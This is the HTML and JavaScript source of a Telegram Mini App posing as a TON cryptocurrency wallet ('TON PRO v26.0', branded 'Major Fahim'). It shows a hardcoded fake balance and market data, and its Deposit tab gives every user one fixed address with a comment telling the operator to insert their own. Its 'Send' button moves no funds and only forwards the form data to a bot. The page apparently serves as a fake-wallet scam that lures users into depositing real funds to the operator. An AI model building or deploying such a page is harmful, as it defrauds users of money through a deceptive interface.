<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON PRO v26.0 - Major Fahim</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <style>
        body { background-color: #000; color: #fff; font-family: sans-serif; }
        .glass-card { background: #1c1c1e; border: 1px solid #2c2c2e; border-radius: 24px; }
        .tab-content { display: none; }
        .active { display: block; animation: fadeIn 0.3s ease; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .nav-btn.active-nav { color: #007aff; }
    </style>
</head>
<body class="p-4 pb-24">

    <div class="flex justify-between items-center mb-6">
        <div class="flex items-center gap-2">
            <div class="bg-blue-600 p-2 rounded-lg">
                <span class="font-bold text-white">T</span>
            </div>
            <h1 class="text-xl font-bold italic">TON PRO <span class="text-gray-500 text-xs">v26.0</span></h1>
        </div>
        <div class="bg-gray-800 px-3 py-1 rounded-full text-[10px] font-bold text-blue-400 border border-blue-900">
            MAJOR FAHIM
        </div>
    </div>

    <div id="home" class="tab-content active">
        <div class="glass-card p-8 mb-6 text-center">
            <p class="text-gray-400 text-sm mb-2">Total Balance</p>
            <h2 class="text-5xl font-bold mb-2">124.50 <span class="text-blue-500 text-2xl">TON</span></h2>
            <p class="text-green-400 font-bold">≈ ৳85,420.00 BDT</p>
        </div>

        <div class="grid grid-cols-2 gap-4 mb-8">
            <button onclick="showTab('send')" class="glass-card p-6 flex flex-col items-center gap-2 active:scale-95 transition">
                <span class="text-2xl">🚀</span>
                <span class="font-bold text-blue-400 uppercase text-xs tracking-widest">Send</span>
            </button>
            <button onclick="showTab('deposit')" class="glass-card p-6 flex flex-col items-center gap-2 active:scale-95 transition">
                <span class="text-2xl">📥</span>
                <span class="font-bold text-orange-400 uppercase text-xs tracking-widest">Deposit</span>
            </button>
        </div>

        <h3 class="font-bold mb-4">Market Analysis</h3>
        <div class="glass-card p-4 flex justify-between items-center">
            <div class="flex items-center gap-3">
                <div class="bg-blue-500/20 p-2 rounded-xl">💎</div>
                <div>
                    <p class="font-bold">TON / USD</p>
                    <p class="text-xs text-gray-500">$7.24</p>
                </div>
            </div>
            <p class="text-green-400 font-bold">+5.24%</p>
        </div>
    </div>

    <div id="send" class="tab-content">
        <h2 class="text-2xl font-bold mb-6">Send TON</h2>
        <div class="space-y-4">
            <div>
                <label class="text-xs text-gray-500 ml-2">RECIPIENT ADDRESS</label>
                <input id="target" type="text" placeholder="Enter TON address" class="w-full bg-gray-900 border border-gray-800 p-4 rounded-2xl focus:outline-none focus:border-blue-500">
            </div>
            <div>
                <label class="text-xs text-gray-500 ml-2">AMOUNT (TON)</label>
                <input id="amt" type="number" placeholder="0.00" class="w-full bg-gray-900 border border-gray-800 p-4 rounded-2xl focus:outline-none focus:border-blue-500">
            </div>
            <button onclick="processSend()" class="w-full bg-blue-600 p-4 rounded-2xl font-bold mt-4 active:scale-95 transition">CONFIRM TRANSFER</button>
            <button onclick="showTab('home')" class="w-full text-gray-500 text-sm font-bold uppercase py-2">Cancel</button>
        </div>
    </div>

    <div id="deposit" class="tab-content">
        <h2 class="text-2xl font-bold mb-6 text-center">Deposit</h2>
        <div class="glass-card p-6 flex flex-col items-center">
            <div id="qrcode" class="bg-white p-2 rounded-xl mb-6"></div>
            <p class="text-xs text-gray-500 mb-2 uppercase">Your Wallet Address</p>
            <div class="bg-black/50 p-3 rounded-lg border border-gray-800 w-full mb-6">
                <p id="wallet-addr" class="text-[10px] break-all text-center text-gray-300">Loading...</p>
            </div>
            <button onclick="copyAddr()" class="bg-blue-600/20 text-blue-400 px-8 py-3 rounded-full font-bold active:scale-95 transition">COPY ADDRESS</button>
        </div>
    </div>

    <div id="history" class="tab-content">
        <h2 class="text-2xl font-bold mb-6">History</h2>
        <div class="text-center py-20">
            <div class="text-gray-700 text-4xl mb-4">📜</div>
            <p class="text-gray-500">No recent transactions found</p>
        </div>
    </div>

    <div class="fixed bottom-0 left-0 right-0 h-20 bg-[#1c1c1e]/80 backdrop-blur-2xl rounded-t-[32px] border-t border-white/5 flex justify-around items-center px-6">
        <button onclick="showTab('home')" id="nav-home" class="nav-btn active-nav flex flex-col items-center gap-1">
            <span>🏠</span>
            <span class="text-[9px] font-black uppercase">Wallet</span>
        </button>
        <button onclick="showTab('history')" id="nav-history" class="nav-btn flex flex-col items-center gap-1 text-white/30">
            <span>🕒</span>
            <span class="text-[9px] font-black uppercase">History</span>
        </button>
    </div>

    <script>
        const tele = window.Telegram.WebApp;
        tele.expand();
        tele.enableClosingConfirmation();

        // ১. আপনার আসল অ্যাড্রেস এখানে দিন
        const MY_WALLET = "UQB T6y0FDsQD6DO0VLGOrNjqtBFwL1j5gijfd0jmXzP-8QT"; 

        function showTab(id) {
            tele.HapticFeedback.impactOccurred('light');
            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            
            // Nav Highlighting
            document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('active-nav', 'text-white/30'));
            if(id === 'home') document.getElementById('nav-home').classList.add('active-nav');
            else if(id === 'history') document.getElementById('nav-history').classList.add('active-nav');
            else document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.add('text-white/30'));

            if (id === 'deposit') {
                document.getElementById('qrcode').innerHTML = "";
                new QRCode(document.getElementById("qrcode"), {
                    text: MY_WALLET,
                    width: 180,
                    height: 180,
                    colorDark : "#000000",
                    colorLight : "#ffffff",
                    correctLevel : QRCode.CorrectLevel.H
                });
                document.getElementById('wallet-addr').innerText = MY_WALLET;
            }
        }

        function copyAddr() {
            navigator.clipboard.writeText(MY_WALLET);
            tele.HapticFeedback.notificationOccurred('success');
            tele.showAlert("Address Copied to Clipboard!");
        }

        function processSend() {
            const to = document.getElementById('target').value;
            const amount = document.getElementById('amt').value;

            if(!to || !amount || amount <= 0) {
                tele.HapticFeedback.notificationOccurred('error');
                return tele.showAlert("Please enter valid address and amount!");
            }

            tele.showConfirm(`Confirm sending ${amount} TON to:\n${to}`, (ok) => {
                if(ok) {
                    tele.HapticFeedback.impactOccurred('heavy');
                    // বোটের কাছে ডাটা পাঠানো হচ্ছে
                    tele.sendData(JSON.stringify({
                        action: "send",
                        to: to,
                        amount: amount
                    }));
                }
            });
        }
    </script>
</body>
                </html>
